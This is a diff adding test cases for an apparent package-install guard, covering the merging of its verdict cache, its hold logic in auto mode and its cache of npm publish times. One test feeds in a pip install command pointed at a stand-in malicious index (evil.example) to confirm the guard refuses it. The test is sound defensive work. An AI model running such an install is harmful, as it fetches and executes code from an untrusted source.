@@ -152,3 +152,54 @@ try:
 finally:
     guard_core.scan_packages = keep
 print("verdict_cache decisions: all cases passed")
+
+# two hooks at the same time (parallel tool calls): both sets of entries survive, each with its own expiry, and a
+# hold one of them used up stays used up
+with tempfile.TemporaryDirectory() as d:
+    VC.begin(d)
+    VC.note_held(["pypi:a==1"])
+    VC.end()
+    VC.begin(d)                                                     # hook B reads the file (a==1 held)
+    snapshot_b = json.loads(json.dumps(VC._state["doc"]))
+    VC.end()
+    VC.begin(d)                                                     # hook A uses up the hold and adds an entry
+    VC.forget_held(["pypi:a==1"])
+    VC.put(VC.key("pypi", "x", "1.0", "x.whl:1"), se.Verdict("ALLOW", 0.0, [], se.ScanFeatures(name="x", version="1.0", fetch_ok=True)))
+    VC.end()
+    VC.begin(d)                                                     # hook B ends later with its older view + its entry
+    VC._state["doc"] = snapshot_b
+    VC.put(VC.key("pypi", "y", "1.0", "y.whl:1"), se.Verdict("ALLOW", 0.0, [], se.ScanFeatures(name="y", version="1.0", fetch_ok=True)))
+    VC.end()
+    doc = json.loads((Path(d) / ".aegis/cache/verdicts.json").read_text())
+    assert {"pypi:x==1.0#x.whl:1", "pypi:y==1.0#y.whl:1"} <= set(doc["entries"]), doc["entries"].keys()
+    VC.begin(d)
+    assert not VC.held_before(["pypi:a==1"]), doc["held"]
+    VC.end()
+
+# auto mode, a hold with no name and version (an index the guard cannot scan): the same command again goes ahead;
+# the same command held for something else is a new hold
+keep = guard_core.scan_packages
+guard_core.scan_packages = fake_scan
+try:
+    with tempfile.TemporaryDirectory() as d:
+        Path(d, ".aegis").mkdir()
+        Path(d, ".aegis", "policy.json").write_text(json.dumps({"mode": "auto"}))
+        c = "pip install --index-url https://evil.example/simple good==2.0"
+        first = guard_core.check_command(c, d)
+        assert first.action == "refuse" and "same install again" in first.reason, first
+        assert guard_core.check_command(c, d).action == "allow"
+        other = "pip install --index-url https://other.example/simple good==2.0"
+        assert guard_core.check_command(other, d).action == "refuse"
+finally:
+    guard_core.scan_packages = keep
+
+# npm publish times read once are kept for the next command
+with tempfile.TemporaryDirectory() as d:
+    VC.begin(d)
+    assert VC.published("left-pad", "1.3.0") is None
+    VC.note_published("left-pad", "1.3.0", "2018-04-01T00:00:00+00:00")
+    VC.end()
+    VC.begin(d)
+    assert VC.published("left-pad", "1.3.0") == "2018-04-01T00:00:00+00:00"
+    VC.end()
+print("verdict_cache merge and holds: all cases passed")
